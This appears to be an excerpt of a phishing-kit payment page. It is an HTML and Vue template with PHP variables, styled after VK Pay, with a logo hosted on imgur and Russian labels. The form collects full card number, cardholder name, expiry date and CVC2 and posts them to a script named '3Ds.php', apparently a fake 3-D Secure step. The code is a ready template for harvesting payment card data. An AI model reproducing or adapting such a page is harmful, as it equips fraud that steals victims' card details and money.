...
<form method='POST' action='3Ds.php' class='credit-card-form__form js-card-form' autocomplete='on'>
    ...
    <div class="wrapper" id="app">
        ...
        <div class="card-form">
            ...
            <div class="pay-card-layout__header_type_vkpay">
                <div style="border-bottom: 1px solid #ced6e0; padding-bottom: 15px; padding-left: 15px;">
                    <img src="https://i.imgur.com/DyaaBJk.jpg" style="width: 20%;margin-left: auto;margin-right: auto;display: block;">
                </div>
            </div>
            <br><br>
                        ...
                        <div class="card-item__wrapper">
                            <div class="card-item__top">
                                ...
                                <div class="card-item__type">
                                    <transition name="slide-fade-up">
                                        <img v-bind:src="'/assets/img/cards/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
                                    </transition>
                                </div>
                            </div>
                            ...
                            <div class="card-item__content">
                                ...
                                <div class="card-item__date" ref="cardDate">
                                    <label for="cardMonth" class="card-item__dateTitle">ММ/ГГ</label>
                                    ...
                                    <label for="cardYear" class="card-item__dateItem">
                                        <transition name="slide-fade-up">
                                            <span name="" v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span>
            ...
            <div class="card-form__inner">
                <div class="card-input">
                    ...
                    <input type="text" placeholder="#### #### #### ####" name="card_number" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required>
                </div>
                <div class="card-input">
                    <label for="cardName" class="card-input__label">Держатель карты</label>
                    <input type="text" placeholder="IVAN IVANOV" name="cardholder" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required>
                </div>
                <div class="card-form__row">
                    <div class="card-form__col">
                        <div class="card-form__group">
                            <label for="cardMonth" class="card-input__label">Срок действия</label>
                            <select name="expdate1" class="card-input__input -select" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
                                <option value="" disabled selected>Месяц</option>
                                <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n">
                                    {{n < 10 ? '0' + n : n}}
                                </option>
                            </select>
                            <select name="expdate2" class="card-input__input -select" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
                    ...
                    <div class="card-form__col -cvv">
                        <div class="card-input">
                            ...
                            <input type="text" placeholder="***" name="cvc2" class="card-input__input" id="cardCvv" v-mask="'####'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required>
                        </div>
                    </div>
                </div>

                <h3 style="text-align: center; margin: 0;">Сумма к <?=$h3;?> <?=$amount;?> RUB</h3>

                <div class="credit-card-form__submit">
                    <div class="credit-card-form__submit-inner">
                        <input type='submit' class='card-form__button' name='submit' value='<?=$button;?>'>
                        <input type='hidden' name='solt' value='<?=$solt;?>'>
                    </div>
                </div>
            </div>
